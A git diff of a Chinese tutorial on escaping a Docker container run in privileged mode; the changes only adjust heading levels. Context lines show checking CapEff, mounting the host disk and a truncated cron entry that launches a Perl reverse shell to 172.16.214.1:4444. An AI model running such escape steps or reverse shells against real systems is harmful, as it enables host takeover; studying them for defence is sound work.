@@ -7,7 +7,7 @@ title: Privileged 特权模式容器逃逸
 
 ---
 
-# 搭建
+## 搭建
 
 例如当前有个普通用户 teamssix，并且是在 docker 用户组内的
 
@@ -19,7 +19,7 @@ title: Privileged 特权模式容器逃逸
 docker run --rm --privileged=true -it alpine
 ```
 
-# 检测
+## 检测
 
 在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff
 
@@ -27,9 +27,9 @@ docker run --rm --privileged=true -it alpine
 cat /proc/self/status | grep CapEff
 ```
 
-# 复现
+## 复现
 
-## 方法一
+### 方法一
 
 查看挂载磁盘设备
 
@@ -65,7 +65,7 @@ echo $'*/1 * * * * perl -e \'use Socket;$i="172.16.214.1";$p=4444;socket(S,PF_IN
 
 <img width="1200" src="/img/1650014458.png">
 
-## 方法二
+### 方法二
 
 ```bash
 mount /dev/sda1 /mnt
